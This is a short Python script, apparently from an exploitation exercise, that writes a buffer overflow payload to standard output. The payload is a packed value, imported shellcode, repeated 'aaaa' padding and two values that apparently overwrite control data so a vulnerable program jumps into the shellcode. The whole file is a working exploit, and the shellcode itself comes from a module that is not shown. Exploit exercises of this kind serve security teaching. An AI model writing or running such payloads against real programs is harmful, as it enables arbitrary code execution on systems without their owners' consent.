import struct
import sys
from struct import pack
from shellcode import shellcode

sys.stdout.buffer.write(pack("<I",0x40000000)+shellcode+pack("<I",0x61616161)*9 + pack("<I",0xfe705061) + pack("<I",0x616161bf))
